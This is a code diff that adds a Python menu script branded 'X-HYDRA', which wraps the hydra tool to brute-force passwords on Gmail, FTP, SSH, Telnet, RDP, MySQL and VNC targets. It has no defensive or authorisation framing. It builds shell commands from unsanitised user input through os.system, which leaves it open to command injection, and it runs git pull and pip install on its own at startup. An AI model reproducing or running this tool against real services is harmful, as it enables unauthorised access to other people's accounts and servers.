@@ -1,0 +1,135 @@
+#!/bin/python
+
+import os,sys,time
+try:
+    from art import *
+except ModuleNotFoundError:
+    os.system('pip install art ')
+    from art import *
+
+
+def update():
+  os.system('git pull')
+
+def back():
+  input("Press Enter To Go Back")
+  menu()
+
+def author():
+  print("          \033[37m[\033[31m+\033[37m] DEVELOPED BY DEVIL MASTER \033[37m[\033[31m+\033[37m]")
+  print("          \033[37m[\033[31m+\033[37m]     github.com/isuruwa    \033[37m[\033[31m+\033[37m]\n\n")
+
+def menu():
+  os.system('clear')
+  print("\033[1;96m ")
+  tprint("""    X-HYDRA\n""")
+  author()
+  print("\033[1;32m [1] Gmail  Bruteforce")
+  print("\033[1;32m [2] FTP    Bruteforce")
+  print("\033[1;32m [3] SSH    Bruteforce")
+  print("\033[1;32m [4] Telnet Bruteforce")
+  print("\033[1;32m [5] RDP    Bruteforce")
+  print("\033[1;32m [6] MySQL  Bruteforce")
+  print("\033[1;32m [7] VNC    Bruteforce")
+  print("\033[1;32m [0] EXIT             ")
+  print("")
+  choice = input("\033[37m[\033[31m+\033[37m]\033[91m  Enter Choice : ")
+
+  if choice == "1":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""       GMAIL""")
+    author()
+    target = input("\033[1;96m [*] Enter Gmail : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (target, list))
+    back()
+
+  elif choice == "2":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""              FTP""")
+    author()
+    username = input("\033[1;96m [*] Enter Username : ")
+    target = input("\033[1;95m [*] Enter IP/Hostname : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -l %s -P %s %s ftp" % (username, list, target))
+    back()
+
+  elif choice == "3":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""              SSH""")
+    author()
+    username = input("\033[1;96m [*] Enter Username : ")
+    target = input("\033[1;95m [*] Enter IP/Hostname : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -l %s -P %s %s ssh" % (username, list, target))
+    back()
+
+  elif choice == "4":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""        Telnet""")
+    author()
+    username = input("\033[1;96m [*] Enter Username : ")
+    target = input("\033[1;95m [*] Enter IP/Hostname : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -l %s -P %s %s telnet" % (username, list, target))
+    back()
+
+  elif choice == "5":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""              RDP""")
+    author()
+    username = input("\033[1;96m [*] Enter Username : ")
+    target = input("\033[1;95m [*] Enter IP/Hostname : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (username, list, target))
+    back()
+
+  elif choice == "6":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""         MySQL""")
+    author()
+    username = input("\033[1;96m [*] Enter Username : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (username, list))
+    back()
+
+  elif choice == "7":
+    os.system('clear')
+    print("\033[1;95m ")
+    tprint("""              VNC""")
+    author()
+    target = input("\033[1;96m [*] Enter IP/Hostname : ")
+    list = input("\033[1;32m [*] Enter Wordlist : ")
+    os.system("hydra -P %s -e n -t 1 %s vnc -V" % (list, target))
+    back()
+
+  elif choice == "0":
+    print("")
+    print("          \033[37m[\033[31m+\033[37m]         THANK YOU         \033[37m[\033[31m+\033[37m]\n")
+    time.sleep(1)
+    print("          \033[37m[\033[31m+\033[37m] DEVELOPED BY DEVIL MASTER \033[37m[\033[31m+\033[37m]\n")
+    print("          \033[37m[\033[31m+\033[37m]     github.com/isuruwa    \033[37m[\033[31m+\033[37m]\n")
+
+  elif choice == "":
+    menu()
+
+  else:
+    print("\033[91m[!] Wrong Choice")
+    time.sleep(1)
+    menu()
+
+
+
+update()
+menu()
+
+
+
+
+
